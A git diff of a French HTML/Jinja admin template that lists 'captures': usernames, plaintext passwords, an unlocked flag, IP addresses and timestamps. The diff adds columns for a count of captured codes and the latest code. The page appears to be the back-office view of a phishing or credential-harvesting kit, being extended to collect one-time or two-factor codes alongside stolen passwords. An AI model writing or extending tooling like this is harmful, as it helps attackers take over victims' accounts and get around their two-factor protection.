@@ -17,32 +17,19 @@
       </nav>
     </header>
 
-    <table>
-      <thead>
-        <tr><th>#</th><th>Identifiant</th><th>Mot de passe</th><th>Débloqué</th><th>IP</th><th>Reçu</th></tr>
-      </thead>
-      <tbody>
-        {% for e in entrees %}
-        <tr>
-          <td class="num">{{ e['id'] }}</td>
-          <td>{{ e['identifiant'] }}</td>
-          <td class="mono">{{ e['mot_de_passe'] }}</td>
-          <td>{{ 'oui' if e['debloque'] else '—' }}</td>
-          <td class="num">{{ e['ip'] }}</td>
-          <td class="num">{{ e['recu_le'] }}</td>
-        </tr>
-        {% else %}
-        <tr><td colspan="6" class="vide">Aucune capture.</td></tr>
-        {% endfor %}
-      </tbody>
-    </table>
-  </main>
-</body>
-</html>
-<div class="tableau-scroll">
+    <div class="tableau-scroll">
       <table>
         <thead>
-          <tr><th>#</th><th>Identifiant</th><th>Mot de passe</th><th>Débloqué</th><th>IP</th><th>Reçu</th></tr>
+          <tr>
+            <th>#</th>
+            <th>Identifiant</th>
+            <th>Mot de passe</th>
+            <th>Débloqué</th>
+            <th>Codes</th>
+            <th>Dernier code</th>
+            <th>IP</th>
+            <th>Reçu</th>
+          </tr>
         </thead>
         <tbody>
           {% for e in entrees %}
@@ -51,12 +38,23 @@
             <td>{{ e['identifiant'] }}</td>
             <td class="mono">{{ e['mot_de_passe'] }}</td>
             <td>{{ 'oui' if e['debloque'] else '—' }}</td>
+            <td class="num">
+              {% if e['nb_codes'] %}
+                <a class="lien-code" href="/admin/codes/{{ e['id'] }}">{{ e['nb_codes'] }}</a>
+              {% else %}
+                0
+              {% endif %}
+            </td>
+            <td class="mono">{{ e['dernier_code'] or '—' }}</td>
             <td class="num">{{ e['ip'] }}</td>
             <td class="num">{{ e['recu_le'] }}</td>
           </tr>
           {% else %}
-          <tr><td colspan="6" class="vide">Aucune capture.</td></tr>
+          <tr><td colspan="8" class="vide">Aucune capture.</td></tr>
           {% endfor %}
         </tbody>
       </table>
     </div>
+  </main>
+</body>
+</html>
